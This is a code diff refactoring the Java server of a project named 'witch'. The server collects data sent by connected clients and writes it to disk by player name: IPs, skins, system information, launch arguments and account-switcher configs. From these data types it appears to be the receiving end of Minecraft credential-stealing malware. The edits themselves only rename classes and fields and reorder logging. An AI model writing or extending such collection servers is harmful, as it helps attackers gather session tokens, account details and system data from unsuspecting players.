@@ -1,6 +1,8 @@
 package me.soda.witch.server.server;
 
 import com.google.gson.Gson;
+import me.soda.witch.server.data.ConnectionInfo;
+import me.soda.witch.server.utils.Utils;
 import me.soda.witch.shared.Crypto;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.socket.Connection;
@@ -21,7 +23,7 @@ import java.util.concurrent.ConcurrentHashMap;
 public class Server extends TcpServer {
     private static final Logger LOGGER = LoggerFactory.getLogger(Server.class);
     private static final Gson GSON = new Gson();
-    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
+    public final ConcurrentHashMap<Connection, ConnectionInfo> clientMap = new ConcurrentHashMap<>();
     public final SendUtil send = new SendUtil();
     public final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
     public final ServerConfig config = Utils.getServerConfig();
@@ -29,6 +31,7 @@ public class Server extends TcpServer {
 
     public Server() throws IOException {
         super();
+        LOGGER.info("--@@@@@@@ By Soda5601 @@@@@@@--");
         LOGGER.info("Server Config: {}", GSON.toJson(config));
         LOGGER.info("Client Config: {}", GSON.toJson(clientDefaultConf));
         LOGGER.info("Server started on {}.", config.port);
@@ -44,15 +47,14 @@ public class Server extends TcpServer {
     public void onOpen(Connection conn) {
         String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
         LOGGER.info("Client connected: {} ID: {}", address, clientIndex);
-        clientMap.put(conn, new Info(clientIndex));
+        clientMap.put(conn, new ConnectionInfo(clientIndex));
         clientIndex++;
     }
 
     @Override
     public void onMessage(Connection conn, Message message) {
-        Info info = clientMap.get(conn);
-        int id = info.index;
-        LOGGER.info("Received message: {} From ID {}", message.data.getClass().getName(), id);
+        ConnectionInfo info = clientMap.get(conn);
+        int id = info.id;
         try {
             if (message.data instanceof ByteData data) {
                 switch (data.id) {
@@ -61,7 +63,7 @@ public class Server extends TcpServer {
                         FileUtil.write(file, data.bytes());
                     }
                     case "skin" -> {
-                        String playerName = info.playerData.playerName;
+                        String playerName = info.player.playerName;
                         File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                         FileUtil.write(file, data.bytes());
                     }
@@ -79,30 +81,29 @@ public class Server extends TcpServer {
                         }
                         case "ip" -> info.ip = msg;
                         case "iasconfig", "runargs", "systeminfo", "props" -> {
-                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.playerData.playerName, true));
+                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
                             FileUtil.write(file, msg);
                         }
                     }
                 }
             } else if (message.data instanceof PlayerData data) {
-                info.playerData = data;
-            } else {
-                LOGGER.info("Message: {} {}", message.data.getClass().getName(), GSON.toJson(message.data));
+                info.player = data;
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
+        LOGGER.info("Received message: {} From ID {}", message.data.getClass().getName(), id);
     }
 
     @Override
     public void onClose(Connection conn, DisconnectData disconnectData) {
-        LOGGER.info("Client disconnected: ID: {}", clientMap.get(conn).index);
+        LOGGER.info("Client disconnected: ID: {}", clientMap.get(conn).id);
         clientMap.remove(conn);
     }
 
     public class SendUtil {
-        private List<Connection> connCollection;
         public boolean all = true;
+        private List<Connection> connCollection;
 
         public void trySendBytes(String messageType, byte[] bytes) {
             trySend(Message.fromBytes(messageType, bytes));
